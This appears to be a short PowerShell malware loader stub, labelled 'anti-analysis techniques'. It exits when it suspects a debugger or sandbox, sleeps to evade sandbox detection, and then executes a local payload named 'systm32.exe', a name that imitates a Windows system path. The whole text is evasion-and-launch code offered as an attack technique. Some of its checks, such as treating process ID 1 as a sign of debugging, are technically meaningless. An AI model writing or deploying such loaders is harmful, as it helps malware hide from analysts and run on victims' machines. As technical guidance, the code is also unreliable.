
    # Advanced anti-analysis techniques
    $processId = [System.Diagnostics.Process]::GetCurrentProcess().Id
    $processName = [System.Diagnostics.Process]::GetCurrentProcess().ProcessName
    $processPath = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
    
    # Check for debugging
    if ($processId -eq 1) { exit }
    
    # Check for sandbox
    if ((Get-Service -Name winmgmt | Select-Object -ExpandProperty Status) -ne "Running") { exit }
    
    # Sleep to evade sandbox detection
    Start-Sleep -Seconds 5
    
    # Execute payload
    Invoke-Expression -Command "& .\systm32.exe"
    